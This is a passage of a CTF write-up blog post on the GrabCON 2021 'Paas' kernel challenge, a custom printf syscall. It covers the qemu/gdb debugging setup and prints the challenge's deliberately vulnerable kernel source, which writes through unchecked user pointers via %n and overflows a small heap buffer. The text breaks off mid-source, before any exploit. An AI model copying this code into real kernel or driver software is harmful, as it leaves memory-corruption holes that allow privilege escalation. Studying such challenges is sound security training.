<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>GrabCON 2021 - Paas</title>
	
	<meta name="author" content="stdnoerr">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/stdnoerr">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/stdnoerr">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=35" class="img-circle" />
				stdnoerr's blog
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="background: url(/assets/media/cover.jpg) no-repeat !important;">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=150" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">stdnoerr's blog</a>
    </h3>
</header>


<div id="bio" class="text-center">
	CTFer | pwner | wanna learn everything
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/stdnoerr">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/stdnoerr">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>GrabCON 2021 - Paas </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   September 
	   10th,
	   
	   2021
	 </span>
	  <div class="article_body">
	  <p>I played GrabCON CTF 2021 to check the challenges. “Pass” especially got my attention because it is a kernel exploitation challenge. I thought it is the best time I work on some kernel challenges. So, I will approach it as a beginner and try to explain as much as I can. I did not solve it during the CTF. Shoutout to <code class="language-plaintext highlighter-rouge">00xc#0275</code> from Scavengar Security for being the only person who solved it during the CTF. Checkout his <a href="https://scavengersecurity.com/posts/grabcon-paas/">writeup</a> also. You can download the challenge file <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/kernel/grabcon_pass/">here</a>.</p>

<h1 id="environment-setup">Environment Setup</h1>
<p>You get <code class="language-plaintext highlighter-rouge">bzImage</code>, <code class="language-plaintext highlighter-rouge">run.sh</code> and <code class="language-plaintext highlighter-rouge">printf.c</code> files and <code class="language-plaintext highlighter-rouge">initramfs</code> folder when you extract the provided file.<br />
First we will extract <code class="language-plaintext highlighter-rouge">vmlinux</code> file from <code class="language-plaintext highlighter-rouge">bzImage</code> using <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">this</a> script. <code class="language-plaintext highlighter-rouge">vmlinux</code> is uncompressed kernel file. But, we need to convert this into an elf file for getting the symbols. For this, I used <a href="https://github.com/marin-m/vmlinux-to-elf/">this</a> script. I named the elf file <code class="language-plaintext highlighter-rouge">vmlinux_elf</code>.<br />
Second, we need to change some configuration to be able to debug the challenge. For a gdb connection, add <code class="language-plaintext highlighter-rouge">-gdb tcp::&lt;port&gt;</code> to the qemu command in <code class="language-plaintext highlighter-rouge">run.sh</code>. To connect to the connection, start gdb with the <code class="language-plaintext highlighter-rouge">vmlinux_elf</code> file. Then run <code class="language-plaintext highlighter-rouge">target remote :&lt;port&gt;</code>. Adding <code class="language-plaintext highlighter-rouge">-S</code> to the qemu will make it stop until the gdb is connected. I advise to disable kaslr, smep, smap and kpti for the purpose of debugging.<br />
Lastly, to be able to read some files we will change the uid in <code class="language-plaintext highlighter-rouge">initramfs/init</code> file from <code class="language-plaintext highlighter-rouge">1000</code> to <code class="language-plaintext highlighter-rouge">0</code>.<br />
To run the challenge we need to compress the <code class="language-plaintext highlighter-rouge">initramfs</code> folder to a cpio archive. I used to following <code class="language-plaintext highlighter-rouge">run.sh</code> file to compile the exploit to test, compress <code class="language-plaintext highlighter-rouge">initramfs</code> and run qemu. (I ran it inside <code class="language-plaintext highlighter-rouge">initramfs</code> folder)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

gcc exploit.c <span class="nt">-static</span> <span class="nt">-o</span> exploit
find <span class="nb">.</span> <span class="nt">-print0</span> | cpio <span class="nt">--null</span> <span class="nt">-ov</span> <span class="nt">--format</span><span class="o">=</span>newc | <span class="nb">gzip</span> <span class="nt">-1</span> <span class="o">&gt;</span> ../initramfs.cpio.gz

qemu-system-x86_64 <span class="nt">-m</span> 256M <span class="nt">-initrd</span> ../initramfs.cpio.gz <span class="nt">-kernel</span> ../bzImage <span class="nt">-nographic</span> <span class="nt">-monitor</span> /dev/null <span class="nt">-append</span> <span class="s2">"nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet"</span> <span class="nt">-gdb</span> tcp::9001 <span class="nt">-S</span>
</code></pre></div></div>
<h1 id="source-code-analysis">Source code analysis</h1>
<p>Pass is short for Printf-as-a-syscall. In the provided kernel, a syscall named printf is added which takes an array of <code class="language-plaintext highlighter-rouge">char</code> pointers and implements some printf functionality. The source code is below: -</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/kernel.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/string.h&gt;
#include &lt;linux/fdtable.h&gt;
</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>

<span class="cp">#ifndef __NR_PRINTF
#define __NR_PRINTF 548
#endif
</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">itoa</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="kt">int</span> <span class="n">base</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">base</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">base</span> <span class="o">&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="p">{</span> <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="k">return</span> <span class="n">result</span><span class="p">;</span> <span class="p">}</span>

    <span class="kt">char</span><span class="o">*</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">result</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr1</span> <span class="o">=</span> <span class="n">result</span><span class="p">,</span> <span class="n">tmp_char</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">tmp_value</span><span class="p">;</span>

    <span class="k">do</span> <span class="p">{</span>
        <span class="n">tmp_value</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
        <span class="n">value</span> <span class="o">/=</span> <span class="n">base</span><span class="p">;</span>
        <span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">=</span> <span class="s">"zyxwvutsrqponmlkjihgfedcba9876543210123456789abcdefghijklmnopqrstuvwxyz"</span><span class="p">[</span><span class="mi">35</span> <span class="o">+</span> <span class="p">(</span><span class="n">tmp_value</span> <span class="o">-</span> <span class="n">value</span> <span class="o">*</span> <span class="n">base</span><span class="p">)];</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span> <span class="n">value</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">tmp_value</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">=</span> <span class="sc">'-'</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ptr</span><span class="o">--</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">ptr1</span> <span class="o">&lt;</span> <span class="n">ptr</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">tmp_char</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
        <span class="o">*</span><span class="n">ptr</span><span class="o">--=</span> <span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>
        <span class="o">*</span><span class="n">ptr1</span><span class="o">++</span> <span class="o">=</span> <span class="n">tmp_char</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">printf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">base_alloc_size</span><span class="p">,</span> <span class="n">off_from_start</span><span class="p">,</span> <span class="n">cmp_offset</span><span class="p">,</span> <span class="n">add_offset</span><span class="p">,</span> <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">written_chars</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">arg_no</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">current_arg</span><span class="p">;</span>

  <span class="kt">char</span> <span class="o">*</span><span class="n">src</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="n">base_alloc_size</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">base_alloc_size</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span> <span class="c1">// allocate base buffer</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">len</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span> <span class="c1">// zero out</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">new_string</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>

  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">cmp_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">add_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span> <span class="p">{</span>

      <span class="c1">// check if there is a dollar notation in format string</span>
      <span class="k">for</span><span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">9</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'$'</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'p'</span> <span class="o">||</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'n'</span> <span class="o">||</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'h'</span> <span class="o">||</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'s'</span> <span class="o">||</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'c'</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>

      <span class="c1">// if yes, get the position</span>
      <span class="k">if</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">},</span> <span class="o">*</span><span class="n">substr</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="sc">'$'</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">substr</span> <span class="o">-</span> <span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">src</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
        <span class="n">kstrtol</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">current_arg</span><span class="p">);</span>
        <span class="n">add_offset</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">cmp_offset</span> <span class="o">=</span> <span class="n">add_offset</span><span class="p">;</span>

      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">add_offset</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">;</span>
        <span class="n">current_arg</span> <span class="o">=</span> <span class="n">arg_no</span><span class="p">;</span>
        <span class="n">arg_no</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="c1">// code for different format strings</span>

      <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'p'</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">num</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
        <span class="n">itoa</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="n">current_arg</span><span class="p">],</span><span class="n">num</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
        <span class="n">off_from_start</span> <span class="o">=</span> <span class="n">dest</span> <span class="o">-</span> <span class="n">new_string</span><span class="p">;</span>
        <span class="n">new_string</span> <span class="o">=</span> <span class="n">krealloc</span><span class="p">(</span><span class="n">new_string</span><span class="p">,</span><span class="n">base_alloc_size</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">+</span><span class="mh">0x2</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
        <span class="n">base_alloc_size</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">num</span><span class="p">);</span>
        <span class="n">dest</span> <span class="o">=</span> <span class="n">new_string</span> <span class="o">+</span> <span class="n">off_from_start</span><span class="p">;</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span><span class="s">"0x"</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">num</span><span class="p">));</span>
        <span class="n">dest</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">+</span><span class="mh">0x2</span><span class="p">;</span>
        <span class="n">src</span> <span class="o">+=</span> <span class="n">add_offset</span><span class="p">;</span>
        <span class="n">written_chars</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'n'</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="n">current_arg</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">written_chars</span><span class="p">;</span>
        <span class="n">src</span> <span class="o">+=</span> <span class="n">add_offset</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'h'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'n'</span><span class="p">)</span> <span class="p">{</span>
          <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="n">current_arg</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">)</span><span class="n">written_chars</span><span class="p">;</span>
          <span class="n">src</span> <span class="o">+=</span> <span class="p">(</span><span class="n">add_offset</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'h'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x3</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'n'</span><span class="p">)</span> <span class="p">{</span>
          <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="n">current_arg</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">written_chars</span><span class="p">;</span>
          <span class="n">src</span> <span class="o">+=</span> <span class="p">(</span><span class="n">add_offset</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'s'</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">string_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">current_arg</span><span class="p">]);</span>
        <span class="n">off_from_start</span> <span class="o">=</span> <span class="n">dest</span> <span class="o">-</span> <span class="n">new_string</span><span class="p">;</span>
        <span class="n">new_string</span> <span class="o">=</span> <span class="n">krealloc</span><span class="p">(</span><span class="n">new_string</span><span class="p">,</span><span class="n">base_alloc_size</span><span class="o">+</span><span class="n">string_len</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
        <span class="n">base_alloc_size</span> <span class="o">+=</span> <span class="n">string_len</span><span class="p">;</span>
        <span class="n">dest</span> <span class="o">=</span> <span class="n">new_string</span> <span class="o">+</span> <span class="n">off_from_start</span><span class="p">;</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span><span class="n">data</span><span class="p">[</span><span class="n">current_arg</span><span class="p">],</span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">current_arg</span><span class="p">]));</span>
        <span class="n">dest</span> <span class="o">+=</span> <span class="n">string_len</span><span class="p">;</span>
        <span class="n">src</span> <span class="o">+=</span> <span class="n">add_offset</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'c'</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// TODO: implement actual functionality of %c</span>
        <span class="n">src</span> <span class="o">+=</span> <span class="mh">0x2</span><span class="p">;</span>
        <span class="n">written_chars</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="sc">'0'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="sc">'9'</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">dbg</span><span class="p">;</span>
        <span class="kt">long</span> <span class="n">len</span><span class="p">;</span>
        <span class="kt">long</span> <span class="n">num</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

        <span class="k">if</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">"</span><span class="se">\"</span><span class="s">c</span><span class="se">\"</span><span class="s"> format string cannot be used with dollar notation</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
          <span class="n">kfree</span><span class="p">(</span><span class="n">new_string</span><span class="p">);</span>
          <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">for</span><span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span><span class="p">(</span><span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">"too long number; len = %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
            <span class="n">kfree</span><span class="p">(</span><span class="n">new_string</span><span class="p">);</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="mh">0x1</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="sc">'0'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="mh">0x1</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="sc">'9'</span><span class="p">);</span>
          <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="mh">0x1</span><span class="o">+</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'c'</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">len</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">"invalid format string</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">kfree</span><span class="p">(</span><span class="n">new_string</span><span class="p">);</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">cmp_offset</span><span class="o">+</span><span class="mh">0x1</span><span class="p">),</span> <span class="n">len</span><span class="p">);</span>
        <span class="n">kstrtol</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num</span><span class="p">);</span>
        <span class="n">written_chars</span> <span class="o">+=</span> <span class="n">num</span><span class="p">;</span>
        <span class="n">src</span> <span class="o">+=</span> <span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="n">add_offset</span><span class="p">);</span>

        <span class="c1">// TODO: implement actual functionality of %c</span>

      <span class="p">}</span>

      <span class="n">src</span> <span class="o">+=</span> <span class="n">cmp_offset</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">off_from_start</span> <span class="o">=</span> <span class="n">dest</span> <span class="o">-</span> <span class="n">new_string</span><span class="p">;</span>
      <span class="n">new_string</span> <span class="o">=</span> <span class="n">krealloc</span><span class="p">(</span><span class="n">new_string</span><span class="p">,</span><span class="o">++</span><span class="n">base_alloc_size</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
      <span class="n">dest</span> <span class="o">=</span> <span class="n">new_string</span> <span class="o">+</span> <span class="n">off_from_start</span><span class="p">;</span>
      <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">;</span>
